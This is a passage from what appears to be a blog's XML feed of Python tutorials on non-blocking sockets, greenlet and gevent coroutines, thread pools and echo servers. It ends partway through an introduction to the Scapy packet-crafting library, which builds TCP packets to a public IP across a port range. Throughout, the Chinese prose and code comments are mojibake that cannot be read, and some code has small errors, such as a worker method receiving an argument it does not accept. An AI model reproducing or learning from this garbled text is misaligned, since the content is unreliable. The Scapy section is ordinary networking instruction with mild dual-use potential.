éé˜»å¡å¥—æ¥å­— """ import socket s = socket.socket() # typeé»˜è®¤æ˜¯tcp s.bind(('127.0.0.1', 8888)) # è¿™ä¸ªå¿…é¡»åœ¨æ“ä½œä¹‹å‰è®¾ç½® s.setblocking(False) # å˜ä¸ºéé˜»å¡å¥—æ¥å­—ï¼Œ ç«‹åˆ»è¿”å›å¼‚å¸¸ s.listen(5) client_list = [] while True: # ç¬¬ä¸€å±‚å¾ªç¯åªè´Ÿè´£ç”Ÿæˆå¯¹ç­‰å¥—æ¥å­— try: coon, addr = s.accept() # å¤šä¸ªcoonæ‰èƒ½ä¸å¤šä¸ªå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ except BlockingIOError as e: pass else: print("å®¢æˆ·ç«¯{}è¿æ¥æˆåŠŸ".format(addr)) coon.setblocking(False) # è®¾ç½®ä¸ºéé˜»å¡ client_list.append(coon) # ä¿ç•™å·²ç”Ÿæˆçš„å¯¹ç­‰å¥—æ¥å­— # print(coon, addr) for client_socket in client_list: # ç¬¬äºŒå±‚å¾ªç¯ æŠŠæ‰€æœ‰å·²ä¿ç•™çš„å¥—æ¥å­—éƒ½æ‰§è¡Œä¸€é try: data = client_socket.recv(1024) except BlockingIOError: pass else: if data: print('{}:{}'.format(client_socket, data.decode())) client_socket.send(data) else: print('{}'.format(client_socket)) client_socket.close() client_list.remove(client_socket) # æˆåŠŸå¤„ç†å®Œä¸€ä¸ªï¼Œå°±ç§»é™¤ä¸€ä¸ª ## å®ç°æ–¹æ³•ï¼šéé˜»å¡+è½®è¯¢ # connectæ“ä½œä¸€å®šä¼šå¼•å‘BlockingIOErrorå¼‚å¸¸ # å¦‚æœè¿æ¥æ²¡æœ‰å»ºç«‹ï¼Œé‚£ä¹ˆsendæ“ä½œå¼•å‘OSErrorå¼‚å¸¸ """ accept é˜»å¡ï¼š åœ¨æ²¡æœ‰æ–°çš„å¥—æ¥å­—æ¥ä¹‹å‰ï¼Œ ä¸èƒ½å¤„ç†å·²ç»å»ºç«‹è¿æ¥çš„å¥—æ¥å­—çš„è¯·æ±‚ recv é˜»å¡: åœ¨æ²¡æœ‰æ¥å—åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®ä¹‹å‰ï¼Œ ä¸èƒ½ä¸å…¶ä»–å®¢æˆ·ç«¯å»ºç«‹è¿æ¥ """ client.py ç›¸åŒ æˆä¸ºå¤§å¸ˆ""" 1. å¤šç»ƒä¹ ï¼Œä¸€å®šè¦å–„äºå‘ç°æ„Ÿå…´è¶£çš„å†…å®¹ï¼Œé€šè¿‡æ‰€å­¦çŸ¥è¯†å»å®ç° 2. å…³æ³¨ç›¸å…³é¢†åŸŸï¼š å¯»æ‰¾å¤§å¸ˆï¼Œè·Ÿéšå¤§å¸‚ï¼Œä¸å¤§å¸ˆåŒè¡Œï¼Œæ´å¯Ÿå¤§å¸ˆï¼Œæˆä¸ºå¤§å¸ˆ çŸ¥ä¹ï¼Œve2x.com, github 3.æ‰©å±•ï¼š æƒ³è¦æé«˜ï¼Œå°±ä¸èƒ½å®ˆç€è‡ªå·±ç°æœ‰çš„ä¸œè¥¿è€Œä¸å»å­¦ä¹ æ–°çš„ 4.åº”ç”¨ï¼š æ ¹æ®è‡ªå·±çš„éœ€æ±‚ï¼ŒåŠ¨æ‰‹å®è·µï¼Œè¾¾åˆ°ç›®æ ‡ å®‰å…¨ï¼š åˆ†æè¡Œä¸ºï¼šé€šè¿‡æ—¥å¿—ï¼Œåˆ†ææ”»å‡»è¡Œä¸º(re) """ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-åç¨‹]]></title>
    <url>%2Fposts%2F52435%2F</url>
    <content type="text"><![CDATA[æ¦‚å¿µ1.è¿›ç¨‹(åŒæ­¥)è¿›ç¨‹æ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹é€šè¿‡è¿›ç¨‹é—´é€šä¿¡æ¥é€šä¿¡ã€‚ ä¸Šä¸‹æ–‡è¿›ç¨‹é—´çš„åˆ‡æ¢å¼€é”€ï¼Œæ¯”è¾ƒå¤§ï¼Œä½†ç›¸å¯¹æ¯”è¾ƒç¨³å®šå®‰å…¨ 2.çº¿ç¨‹ï¼ˆåŒæ­¥ï¼‰çº¿ç¨‹æ˜¯CPUè°ƒåº¦å’Œåˆ†æ´¾çš„åŸºæœ¬å•ä½ã€‚ çº¿ç¨‹é—´é€šä¿¡ä¸»è¦é€šè¿‡å…±äº«å†…å­˜ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¾ˆå¿«ï¼Œèµ„æºå¼€é”€è¾ƒå°‘ï¼Œä½†ç›¸æ¯”è¿›ç¨‹ä¸å¤Ÿç¨³å®šå®¹æ˜“ä¸¢å¤±æ•°æ®ã€‚ 3.åç¨‹ï¼ˆå¼‚æ­¥ï¼‰åç¨‹æ˜¯ä¸€ç§ç”¨æˆ·æ€çš„è½»é‡çº§çº¿ç¨‹ï¼Œåç¨‹çš„è°ƒåº¦å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶ â€œåç¨‹å°±æ˜¯ä½ å¯ä»¥æš‚åœæ‰§è¡Œçš„å‡½æ•°â€ã€‚åç¨‹æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚ éæŠ¢å å¼å¤šä»»åŠ¡ åç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«:1) ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šä¸ªåç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥å•ç‹¬æ‹¥æœ‰å¤šä¸ªåç¨‹ã€‚ 2) çº¿ç¨‹è¿›ç¨‹éƒ½æ˜¯åŒæ­¥æœºåˆ¶ï¼Œè€Œåç¨‹åˆ™æ˜¯å¼‚æ­¥ã€‚ 3) åç¨‹èƒ½ä¿ç•™ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶çš„çŠ¶æ€ï¼Œæ¯æ¬¡è¿‡ç¨‹é‡å…¥æ—¶ï¼Œå°±ç›¸å½“äºè¿›å…¥ä¸Šä¸€æ¬¡è°ƒç”¨çš„çŠ¶æ€ã€‚ 4ï¼‰çº¿ç¨‹æ˜¯æŠ¢å å¼ï¼Œè€Œåç¨‹æ˜¯éæŠ¢å å¼çš„ï¼Œæ‰€ä»¥éœ€è¦ç”¨æˆ·è‡ªå·±é‡Šæ”¾ä½¿ç”¨æƒæ¥åˆ‡æ¢åˆ°å…¶ä»–åç¨‹ï¼Œå› æ­¤åŒä¸€æ—¶é—´å…¶å®åªæœ‰ä¸€ä¸ªåç¨‹æ‹¥æœ‰è¿è¡Œæƒï¼Œç›¸å½“äºå•çº¿ç¨‹çš„èƒ½åŠ›ã€‚ 5ï¼‰åç¨‹å¹¶ä¸æ˜¯å–ä»£çº¿ç¨‹, è€Œä¸”æŠ½è±¡äºçº¿ç¨‹ä¹‹ä¸Š, çº¿ç¨‹æ˜¯è¢«åˆ†å‰²çš„CPUèµ„æº, åç¨‹æ˜¯ç»„ç»‡å¥½çš„ä»£ç æµç¨‹, åç¨‹éœ€è¦çº¿ç¨‹æ¥æ‰¿è½½è¿è¡Œ, çº¿ç¨‹æ˜¯åç¨‹çš„èµ„æº, ä½†åç¨‹ä¸ä¼šç›´æ¥ä½¿ç”¨çº¿ç¨‹, åç¨‹ç›´æ¥åˆ©ç”¨çš„æ˜¯æ‰§è¡Œå™¨(Interceptor), æ‰§è¡Œå™¨å¯ä»¥å…³è”ä»»æ„çº¿ç¨‹æˆ–çº¿ç¨‹æ± , å¯ä»¥ä½¿å½“å‰çº¿ç¨‹, UIçº¿ç¨‹, æˆ–æ–°å»ºæ–°ç¨‹.ã€‚ 6ï¼‰çº¿ç¨‹æ˜¯åç¨‹çš„èµ„æºã€‚åç¨‹é€šè¿‡Interceptoræ¥é—´æ¥ä½¿ç”¨çº¿ç¨‹è¿™ä¸ªèµ„æºã€‚ ä»£ç greenlet # åç¨‹ =>åˆå«ï¼šéæŠ¢å å¼å¤šä»»åŠ¡ # ä¸­æ–­æ‰§è¡Œ # çº¿ç¨‹ """ pip install greenlet """ # åŸºæœ¬ä½¿ç”¨ from greenlet import greenlet import random import time def Producer(): while True: item = random.randint(0, 99) print("proç”Ÿäº§äº†{}".format(item)) c.switch(item) # æš‚åœå½“å‰åç¨‹,åˆ‡æ¢åˆ°(æ‰§è¡Œçš„åç¨‹)æ¶ˆè´¹è€…ï¼Œå¹¶å°†itemä¼ å…¥æ¶ˆè´¹è€… time.sleep(1) def Consumer(): while True: item = p.switch() # åˆ‡æ¢åˆ°ç”Ÿäº§è€…ï¼Œ å¹¶ç­‰å¾…æ¶ˆè´¹è€…ä¼ å…¥item print("æ¶ˆè´¹äº†{}".format(item)) c = greenlet(Consumer) # å°†ä¸€ä¸ªæ™®é€šå‡½æ•°å˜æˆåç¨‹ p = greenlet(Producer) c.switch() # è®©æ¶ˆè´¹è€…å…ˆè¿›å…¥æš‚åœçŠ¶æ€ï¼Œ ï¼ˆåªæœ‰æ¢å¤çš„æ—¶å€™æ‰èƒ½æ¥å—æ•°æ®ï¼‰ """ # greenlet çš„ä»·å€¼ ä»·å€¼ä¸€ï¼š é«˜æ€§èƒ½çš„åŸç”Ÿåç¨‹ ä»·å€¼äºŒï¼š è¯­ä¹‰æ›´åŠ æ˜ç¡®çš„æ˜¾å¼åˆ‡æ¢ ä»·å€¼ä¸‰ï¼š ç›´æ¥å°†å‡½æ•°åŒ…è£…æˆåç¨‹ï¼Œä¿æŒåŸæœ‰ä»£ç é£æ ¼ """ gevent geventæ˜¯ä¸€ä¸ªåŸºäºåç¨‹çš„pythonç½‘ç»œåº“ï¼Œåœ¨é‡åˆ°IOé˜»å¡æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨è¿›è¡Œåˆ‡æ¢ï¼Œå¯ä»¥è®©æˆ‘ä»¬ç”¨åŒæ­¥çš„æ–¹å¼å†™å¼‚æ­¥IOä»£ç ã€‚ # gevent # å½“ä¸€ä¸ªgreenleté‡åˆ°IOæ“ä½œï¼Œæ¯”å¦‚è®¿é—®ç½‘ç»œï¼Œå°±ä¼šè‡ªåŠ¨åˆ‡æ¢ï¼Œç›´åˆ°IOæ“ä½œå®Œæˆï¼Œå†åˆ‡æ¢å›æ¥ # é‡åˆ°é˜»å¡å°±åˆ‡æ¢åˆ°å¦ä¸€ä¸ªåç¨‹ç»§ç»­æ‰§è¡Œ ï¼ """ pip install gevent geventï¼Œé€šè¿‡å°è£…äº† libevï¼ˆåŸºäºepollï¼‰ å’Œ greenlet ä¸¤ä¸ªåº“ã€‚ å¸®æˆ‘ä»¬åšå¥½å°è£…ï¼Œå…è®¸æˆ‘ä»¬ä»¥ç±»ä¼¼äºçº¿ç¨‹çš„æ–¹å¼ä½¿ç”¨åç¨‹ã€‚ ä»¥è‡³äºæˆ‘ä»¬å‡ ä¹ä¸ç”¨é‡å†™åŸæ¥çš„ä»£ç å°±èƒ½å……åˆ†åˆ©ç”¨ epoll å’Œ åç¨‹ å¨åŠ› """ import gevent from gevent.queue import Queue # çŒ´å­è¡¥ä¸ monkey å°†ä¸€äº›é˜»å¡çš„æ¨¡å—åŠ¨æ€çš„ä¿®æ”¹ä¸ºéé˜»å¡ from gevent import monkey;monkey.patch_all() # ä¸ä¼šé˜»å¡äº†å°± from gevent import monkey;monkey.patch_socket() # ä¸ä¼šé˜»å¡äº†å°± import requests import gevent def get_response(): print("start") requests.get("https://www.baidu.com") print("end") tasks = [gevent.spawn(get_response) for i in range(20)] # åˆ›å»ºåç¨‹ gevent.joinall(tasks) # é˜»å¡ç­‰å¾…åç¨‹å®Œæ¯• # --------------------------------------------------------------------- ### gevent å¹¶å‘æœåŠ¡å™¨ import gevent # å°†pythonå†…ç½®çš„socketç›´æ¥æ¢æˆäº†IOå¤šè·¯å¤ç”¨çš„socket from gevent import monkey;monkey.patch_socket() import socket server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) def worker_coroutine(conn): while True: recv_data = conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break if __name__ == '__main__': while True: conn, remote_addr = server.accept() # ç”Ÿæˆä¸€ä¸ªåç¨‹ï¼Œ å¹¶å°†connä½œä¸ºå‚æ•°ä¼ å…¥ gevent.spawn(worker_coroutine, conn) # --------------------------------------------------------------------- # gevent åç¨‹é€šä¿¡ """ é—®é¢˜ä¸€ï¼š åç¨‹ä¹‹é—´ä¸æ˜¯èƒ½é€šè¿‡switché€šä¿¡å˜›ï¼Ÿ æ˜¯çš„ï¼Œç”±äº gevent åŸºäº greenletï¼Œæ‰€ä»¥å¯ä»¥ã€‚ é—®é¢˜äºŒï¼š é‚£ä¸ºä»€ä¹ˆè¿˜è¦è€ƒè™‘é€šä¿¡é—®é¢˜ï¼Ÿ å› ä¸º gevent ä¸éœ€è¦æˆ‘ä»¬ä½¿ç”¨æ‰‹åŠ¨åˆ‡æ¢ï¼Œ è€Œæ˜¯é‡åˆ°é˜»å¡å°±åˆ‡æ¢ï¼Œå› æ­¤æˆ‘ä»¬ä¸ä¼šå»ä½¿ç”¨switch ï¼ """ import gevent from gevent import monkey;monkey.patch_all() from gevent.queue import Queue import random queue = Queue(3) def Producer(): while True: item = random.randint(0, 99) print("ç”Ÿäº§äº†{}".format(item)) queue.put(item) def Consumer(): while True: item = queue.get() print("æ¶ˆè´¹äº†{}".format(item)) p = gevent.spawn(Producer, queue) # å°†å‡½æ•°å°è£…æˆåç¨‹ï¼Œ å¹¶å¼€å§‹è°ƒåº¦ c = gevent.spawn(Consumer, queue) # gevent.sleep(5) gevent.joinall([p, c]) # é˜»å¡ï¼ˆä¸€é˜»å¡å°±åˆ‡æ¢åç¨‹ï¼‰ ç­‰å¾… ç­‰å¾…ä½ å¸¦è¿›æ¥çš„æ‰€æœ‰åç¨‹å¯¹è±¡ç»“æŸ Note: # è¿™ä¸‰å¥ä¸€å®šè¦æ”¾åœ¨æœ€ä¸Šé¢ import gevent from gevent import monkey monkey.patch_all() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>åç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-è‡ªå¸¦çš„çº¿ç¨‹æ± å’Œè¿›ç¨‹æ± ]]></title>
    <url>%2Fposts%2F13775%2F</url>
    <content type="text"><![CDATA[# from multiprocessing import Pool # è¿›ç¨‹æ±  from multiprocessing.dummy import Pool #çº¿ç¨‹æ±  from multiprocessing.pool import ThreadPool # çº¿ç¨‹æ±  import threading import time def func(i): print("{}-------555".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print("å¤„ç†æ•°æ®å®Œæˆ",args, kwargs) pool = Pool(6) # ä¸å†™çš„è¯ é»˜è®¤æ˜¯cpuçš„ä¸ªæ•° # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## æ·»åŠ ä»»åŠ¡ ä¸é˜»å¡ ä¸»è¦ä½¿ç”¨çš„æ–¹æ³• # pool.apply(func=func, ) ## æ·»åŠ ä»»åŠ¡ é˜»å¡ # pool.map(func, [i for i in range(5)]) #æ·»åŠ ä»»åŠ¡ ä¸é˜»å¡ pool.close() #å…³é—­çº¿ç¨‹æ±  ä¸åœ¨æäº¤æ–°çš„ä»»åŠ¡ pool.join() #ç­‰å¾…è¿›ç¨‹æ± ä¸­çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯• print("ä»»åŠ¡ç»“æŸ") ########### çº¿ç¨‹æ± çš„æ­¥éª¤ p = ThreadPool(3) # å®ä¾‹åŒ– p.apply_async(func) # å‡½æ•° # å¯ä»¥å°†è¿”å›å€¼.get() ä½†æ˜¯getä¹Ÿä¼šié˜»å¡ p.close() p.join() # è¿›ç¨‹æ± æ¯”çº¿ç¨‹æ± è€—è´¹èµ„æº # å¯ä»¥å°†è¿”å›å€¼.get() ä½†æ˜¯getä¹Ÿä¼šié˜»å¡ async_result = p.apply_async(func) # å‡½æ•° print(async_result.get()) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çº¿ç¨‹æ± </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-çº¿ç¨‹æ± å¹¶å‘æœåŠ¡å™¨]]></title>
    <url>%2Fposts%2F36711%2F</url>
    <content type="text"><![CDATA[server # ä½¿ç”¨çº¿ç¨‹æ± æ¥å®ç°å¹¶å‘æœåŠ¡å™¨ import socket from multiprocessing.dummy import Pool def worker(conn): while True: recv_data = conn.recv(1000) if not recv_data: break print("å®¢æˆ·ç«¯{}å‘é€äº†{}".format(conn, recv_data.decode())) conn.send(recv_data) conn.close() if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) pool = Pool(3) while True: conn, addr = server.accept() print("å®¢æˆ·ç«¯{}è¿æ¥æˆåŠŸ".format(addr)) pool.apply_async(func=worker, args=(conn,)) client import socket c = socket.socket() c.connect(('127.0.0.1',8888)) while True: msg = input('>>>') if msg: c.send(msg.encode()) # åªèƒ½å‘é€ bytes ç±»å‹çš„æ•°æ® encodeå°†ä¸­æ–‡çš„å˜æˆbyteçš„ print(c.recv(1024)) else: break c.close() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çº¿ç¨‹æ± </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-ç®€å•çš„çº¿ç¨‹æ± çš„å®ç°]]></title>
    <url>%2Fposts%2F52711%2F</url>
    <content type="text"><![CDATA[# å¤šè¿›ç¨‹æœåŠ¡å™¨ åˆ›å»º é”€æ¯ # é€šè¿‡æå‰åˆ›å»ºå¥½çº¿ç¨‹ å½“ä»»åŠ¡æ¥äº† å°±åˆ†é…çº¿ç¨‹å»æ‰§è¡Œ """ ä¸»çº¿ç¨‹ï¼š ç›¸å½“äºç”Ÿäº§è€…ï¼Œåªç®¡å‘çº¿ç¨‹æ± æäº¤ä»»åŠ¡ã€‚ å¹¶ä¸å…³å¿ƒçº¿ç¨‹æ± æ˜¯å¦‚ä½•æ‰§è¡Œä»»åŠ¡çš„ã€‚ å› æ­¤ï¼Œå¹¶ä¸å…³å¿ƒæ˜¯å“ªä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œçš„è¿™ä¸ªä»»åŠ¡ã€‚ çº¿ç¨‹æ± ï¼š ç›¸å½“äºæ¶ˆè´¹è€…ï¼Œè´Ÿè´£æ¥æ”¶ä»»åŠ¡ï¼Œ å¹¶å°†ä»»åŠ¡åˆ†é…åˆ°ä¸€ä¸ªç©ºé—²çš„çº¿ç¨‹ä¸­å»æ‰§è¡Œã€‚ """ from threading import Thread from queue import Queue import time class ThreadPool: def __init__(self, n): # æ„å‘³ç€ä¼ å•¦å‡ æ¬¡ self.queue = Queue() for i in range(n+1): # æ¯ä¸ªçº¿ç¨‹éƒ½å»æ‰§è¡Œç±»é‡Œé¢çš„funcæ–¹æ³• Thread(target=self.work, args=(self.queue, ), daemon=True).start() def work(self): while True: func, args, kwargs = self.queue.get() func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): # ä¸»çº¿ç¨‹è°ƒç”¨çš„ self.queue.put((func, args, kwargs)) # æ‰”åˆ°é˜Ÿåˆ—é‡Œé¢ def join(self): self.queue.join() def task1(): time.sleep(2) print("111") def task2(): time.sleep(2) print("222222") pool = ThreadPool(2) pool.apply_async(task1) pool.apply_async(task2) print("ä»»åŠ¡æäº¤å®Œæˆ") pool.join() print("ä»»åŠ¡å®Œæˆ") document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çº¿ç¨‹æ± </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-å¯é‡å¤åˆ©ç”¨çš„çº¿ç¨‹]]></title>
    <url>%2Fposts%2F20484%2F</url>
    <content type="text"><![CDATA[import threading import queue class MyThread(threading.Thread): def __init__(self): super().__init__() self.queue = queue.Queue() self.daemon = True # å®ˆæŠ¤è¿›ç¨‹ self.start() # def run(self): # åªæœ‰runé‡Œçš„æ‰æ˜¯å­çº¿ç¨‹æ‰§è¡Œçš„ while True: func, args, kwargs = self.queue.get() # ä»é˜Ÿåˆ—å½“ä¸­è·å–ä»»åŠ¡ func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): self.queue.put((func, args, kwargs)) def join(self, timeout=None): # ç­‰å¾…æ‰€æœ‰æäº¤çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯• self.queue.join() # è§£é˜»å¡ def print_one(): print('111111111') def print_two(): print('222222222222') if __name__ == '__main__': t = MyThread() t.apply_async(print_one) t.apply_async(print_two, args=(1,2), kwargs={"a":1,'b':2}) t.join() # çº¿ç¨‹çš„join ç­‰å¾…é˜Ÿåˆ—ç»“æŸ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çº¿ç¨‹æ± </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonä¹‹Scapy]]></title>
    <url>%2Fposts%2F60247%2F</url>
    <content type="text"><![CDATA[å…³äºScapyæ˜¯ä¸€ä¸ªPythonç¨‹åºï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿå‘é€ï¼Œå—…æ¢å’Œå‰–æå¹¶ä¼ªé€ ç½‘ç»œæ•°æ®åŒ…ã€‚æ­¤åŠŸèƒ½å…è®¸æ„å»ºå¯ä»¥æ¢æµ‹ï¼Œæ‰«ææˆ–æ”»å‡»ç½‘ç»œçš„å·¥å…·ã€‚ æ¢å¥è¯è¯´ï¼ŒScapyæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„äº¤äº’å¼æ•°æ®åŒ…æ“ä½œç¨‹åºã€‚å®ƒèƒ½å¤Ÿä¼ªé€ æˆ–è§£ç å¤§é‡åè®®çš„æ•°æ®åŒ…ï¼Œé€šè¿‡çº¿è·¯å‘é€ï¼Œæ•è·å®ƒä»¬ï¼ŒåŒ¹é…è¯·æ±‚å’Œå›å¤ç­‰ç­‰ã€‚Scapyå¯ä»¥è½»æ¾å¤„ç†å¤§å¤šæ•°ç»å…¸ä»»åŠ¡ï¼Œå¦‚æ‰«æï¼Œè·Ÿè¸ªè·¯ç”±ï¼Œæ¢æµ‹ï¼Œå•å…ƒæµ‹è¯•ï¼Œæ”»å‡»æˆ–ç½‘ç»œå‘ç°ã€‚å®ƒå¯ä»¥å–ä»£hpingï¼Œarpspoofï¼Œarp-skï¼Œarpingï¼Œp0fç”šè‡³æ˜¯Nmapï¼Œtcpdumpå’Œtsharkçš„æŸäº›éƒ¨åˆ†ã€‚Scapyä¸»è¦åšä¸¤ä»¶äº‹ï¼šå‘é€æ•°æ®åŒ…å’Œæ¥æ”¶ç­”æ¡ˆã€‚ åœ¨pythonä¸­å¯ä»¥é€šè¿‡scapyè¿™ä¸ªåº“è½»æ¾å®ç°æ„é€ æ•°æ®åŒ…ã€å‘é€æ•°æ®åŒ…ã€åˆ†ææ•°æ®åŒ…ï¼Œä¸ºç½‘ç»œç¼–ç¨‹ä¹‹åˆ©å™¨ï¼ é¡¹ç›®åœ°å€ï¼šhttps://github.com/secdev/scapy å®‰è£…Scapy æœ‰ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š ç›´æ¥åœ¨shellä¸­ä½¿ç”¨# å…ˆä¸‹è½½é¡¹ç›®åˆ°æœ¬åœ° git clone git@github.com:secdev/scapy.git # è¿è¡Œ ./run_scapy # äº¤äº’å¼ä½¿ç”¨ ä½œä¸ºPythonçš„ç¬¬ä¸‰æ–¹åº“ä½¿ç”¨# å®‰è£… pip3 install scapy # å¯¼å…¥ from scapy.all import * ä½¿ç”¨æ„é€ æ•°æ®åŒ…from scapy.all import * # 2.æ„é€ æ•°æ®åŒ… IP()åˆ›å»ºä¸€ä¸ªé»˜è®¤æ•°æ®åŒ… # ls(IP()) å¯ä»¥æŸ¥çœ‹IPæ•°æ®åŒ…å¯ä»¥æœ‰å“ªäº›å‚æ•°ã€‚ # å…¶ä»–æ•°æ®åŒ…åŒç†ï¼š TCP(), pkt = IP(dst="114.114.114.114") pkt.show() # æŸ¥çœ‹æ•°æ®åŒ…ä¿¡æ¯ pkt.summary() # æ–¹æ³•æŸ¥çœ‹æ¦‚è¦ä¿¡æ¯ hexdump(pkt) # æŸ¥çœ‹æ•°æ®åŒ…çš„å­—èŠ‚ä¿¡æ¯ # ä½¿ç”¨ '/' æ“ä½œç¬¦æ¥ç»™æ•°æ®åŒ…åŠ ä¸Šä¸€å±‚ # ä¾‹å¦‚æ„é€ ä¸€ä¸ªTCPæ•°æ®åŒ…ï¼Œåœ¨IPå±‚æŒ‡æ˜æ•°æ®åŒ…çš„ç›®çš„åœ°å€ã€‚åœ¨TCPå±‚å¯ä»¥è®¾å®šæ•°æ®åŒ…çš„ç›®çš„ç«¯å£ç­‰ç­‰ã€‚UDPæ•°æ®åŒ…åŒç†ã€‚ tcpkt = IP(dst="114.114.114.114")/TCP() tcpkt.show() # æ•°æ®åŒ…çš„ç›®æ ‡ç«¯å£å¯ä»¥ç”¨èŒƒå›´æ¥è¡¨ç¤ºï¼Œå‘é€çš„æ—¶å€™å°±ä¼šå‘é€dport ä¸åŒçš„å¤šä¸ªæ•°æ®åŒ… tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33)) # å¦‚æœè®¾ç½®äº†å¤šä¸ªå‚æ•°ä¸ºèŒƒå›´çš„ï¼Œæœ€åå‘é€çš„æ•°æ®åŒ…å°±æ˜¯ç¬›å¡å°”ç§¯ã€‚ tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33), sport=(4567, 4568)) for tcp in tcpkt: print(tcp.dport, tcp.sport) å‘é€æ•°æ®åŒ… (å¯èƒ½éœ€è¦ç®¡ç†å‘˜æƒé™)# 3.å‘é€æ•°æ®åŒ… # å‘é€æ•°æ®åŒ…å¯èƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä½¿ç”¨sudo python3 è¿›å…¥pythonå³å¯ã€‚ ## scapyå‘é€æ•°æ®åŒ…æœ‰å¸¸ç”¨çš„å¦‚ä¸‹å‡ ç§æ–¹æ³•ï¼š """ send(pkt) å‘é€ä¸‰å±‚æ•°æ®åŒ…ï¼Œä½†ä¸ä¼šå—åˆ°è¿”å›çš„ç»“æœ(å‘å®Œå°±æ‹‰å€’)ã€‚ sr(pkt) å‘é€ä¸‰å±‚æ•°æ®åŒ…ï¼Œè¿”å›ä¸¤ä¸ªç»“æœï¼Œåˆ†åˆ«æ˜¯æ¥æ”¶åˆ°å“åº”çš„æ•°æ®åŒ…å’Œæœªæ”¶åˆ°å“åº”çš„æ•°æ®åŒ…ã€‚ sr1(pkt) å‘é€ä¸‰å±‚æ•°æ®åŒ…ï¼Œä»…ä»…è¿”å›æ¥æ”¶åˆ°å“åº”çš„æ•°æ®åŒ…ã€‚ sendp(pkt) å‘é€äºŒå±‚æ•°æ®åŒ…ã€‚ srp(pkt) å‘é€äºŒå±‚æ•°æ®åŒ…ï¼Œå¹¶ç­‰å¾…å“åº”ã€‚ srp1(pkt) 